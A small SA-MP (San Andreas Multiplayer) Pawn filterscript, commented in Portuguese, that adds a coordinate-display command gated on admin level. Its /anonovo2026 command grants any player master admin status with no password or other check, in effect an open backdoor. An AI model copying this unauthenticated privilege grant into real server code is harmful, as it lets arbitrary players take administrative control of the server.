#define FILTERSCRIPT
#include <a_samp>

#define NIVEL_MASTER 6

public OnFilterScriptInit() {
    print(">> ADMIN MASTER 2026 ATIVO");
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[]) {
    // Comando: /minhapos
    if(!strcmp(cmdtext, "/minhapos", true)) {
        if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) {
            return SendClientMessage(playerid, -1, "{FF0000}Logue no /anonovo2026 primeiro.");
        }
        
        new Float:x, Float:y, Float:z, Float:a, str[128];
        GetPlayerPos(playerid, x, y, z);
        GetPlayerFacingAngle(playerid, a);
        
        format(str, sizeof(str), "{FFFF00}X: %.4f | Y: %.4f | Z: %.4f | A: %.4f", x, y, z, a);
        SendClientMessage(playerid, -1, str);
        
        // Exibe no console da LemeHost para facilitar a cópia
        printf("COORDENADAS: %.4f, %.4f, %.4f, %.4f", x, y, z, a);
        return 1; // Retorna 1 para evitar o "Unknown Command"
    }

    // Comando: /anonovo2026
    if(!strcmp(cmdtext, "/anonovo2026", true)) {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "Poderes MASTER 2026 ativados!");
        return 1;
    }
    
    return 0; // Se não for nenhum comando deste script, deixa o servidor processar outros
}
